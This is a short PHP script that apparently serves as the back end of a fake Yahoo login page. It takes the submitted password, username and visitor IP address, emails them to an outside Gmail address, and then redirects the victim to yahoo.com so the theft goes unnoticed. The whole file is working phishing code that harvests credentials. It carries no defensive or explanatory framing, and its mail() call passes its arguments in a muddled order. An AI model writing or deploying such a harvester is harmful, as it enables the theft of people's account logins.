<?php

$word = $_POST['Pass'];
$log  = $_POST['username'];
$ip = $_SERVER['REMOTE_ADDR'];


$to ='susanwilson1177@gmail.com';
$subject = 'yahoo';
$message = $word." ".$log." ".$ip;

$headers ='From: '.$log.''.'\n\n';
$headers ="MIME-Version: 1.0 \r\n";
$headers ="Content-type: text/html \r\n";

mail($to,$headers,$message,$subject);

header("location:http://yahoo.com");


?>